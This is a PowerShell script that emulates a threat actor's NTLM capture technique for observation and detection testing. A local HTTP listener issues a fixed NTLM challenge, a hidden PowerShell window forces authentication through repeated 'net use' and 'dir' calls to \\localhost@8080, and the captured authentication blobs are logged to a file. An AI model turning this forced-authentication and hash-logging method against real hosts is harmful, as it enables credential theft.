<#
.SYNOPSIS
Mimics an NTLM challenge-response interaction on an HTTP server.

.DESCRIPTION
This script sets up an HTTP listener on localhost:8080 and responds to incoming requests with a static NTLM Type 2 challenge. Any NTLM messages received are logged to C:\temp\ntlm.txt. This tool is designed for observation and education rather than genuine authentication.

.PARAMETER None
The script does not take any parameters.

.EXAMPLE
.\fancyntlmrelay.ps1

Starts the HTTP listener and waits for incoming NTLM messages.

.NOTES
File Name      : fancyntlmrelay.ps1
Author         : @M_haggis
Prerequisite   : PowerShell V2

.LINK
    https://cert.gov.ua/article/5702579
    https://www.virustotal.com/gui/file/52951f2d92e3d547bad86e33c1b0a8622ac391c614efa3c5d167d8a825937179
    https://gist.github.com/MHaggis/52b090dbb9c2b91d9cdd8c54f2256f74
    https://github.com/Kevin-Robertson/Inveigh/tree/master
    https://www.virustotal.com/gui/file/5c08c1c1b7e089b172e30b9ad452bab7ce64ee48201f603fc96fd9c6e24db1dc
#>

[byte[]]$NTLMType2 =
@(
    0x4e,0x54,0x4c,0x4d,
    0x53,0x53,0x50,0x00,
    0x02,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,
    0x00,0x28,0x00,0x00,
    0x01,0x82,0x00,0x00,
    0x11,0x22,0x33,0x44,
    0x55,0x66,0x77,0x88,
    0x00,0x00,0x00,0x00
)

start-process powershell.exe -WindowStyle hidden {
    for ($var = 1; $var -le 10; $var++) {
        net use f: \\localhost@8080\c$
        dir \\localhost@8080\fg
    }
}

$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add('http://localhost:8080/')
$listener.Start()
Write-Output 'Listening...'

$ntlmt2 = $false

try {
    while ($listener.IsListening) {
        $context = $listener.GetContext()
        $request = $context.Request
        $response = $context.Response

        # Gracefully stop listener on /exit path
        if ($request.Url.PathAndQuery -eq "/exit") {
            $response.StatusCode = 200
            $response.StatusDescription = "OK"
            $message = "Shutting down listener..."
            [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)
            $response.ContentLength64 = $buffer.length
            $output = $response.OutputStream
            $output.Write($buffer, 0, $buffer.length)
            $output.Close()

            $listener.Stop()
            break
        }

        $hostip = $request.RemoteEndPoint
        $headers = $request.Headers
        $message = ''

        foreach ($key in $headers.AllKeys) {
            if ($key -match 'Authorization') {
                [string[]]$values = $headers.GetValues('Authorization')
                $NTLMAuthentication = $values[0] -split '\s+'
                $NTLMType = $NTLMAuthentication[1]
                
                Write-Output $context.Request.RemoteEndPoint.Address.IPAddressToString
				Write-Output $NTLMType
				Add-Content -Path "C:\temp\ntlm.txt" -Value $NTLMType
				$ntlmt2 = $true

                
                $NTLMType2Response = 'NTLM ' + [Convert]::ToBase64String($NTLMType2)
                $response.AddHeader('WWW-Authenticate', $NTLMType2Response)
                $response.AddHeader('Content-Type','text/html')
                $response.StatusCode = 401
                [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)
                $response.ContentLength64 = $buffer.length
                $output = $response.OutputStream
                $output.Write($buffer, 0, $buffer.length)
                $output.Close()
                continue
            } else {
                $response.AddHeader('WWW-Authenticate', 'NTLM')
            }
        }
    }
} catch {
    Write-Error "Error occurred: $_"
} finally {
    $listener.Stop()
    Write-Output "Listener stopped."
}
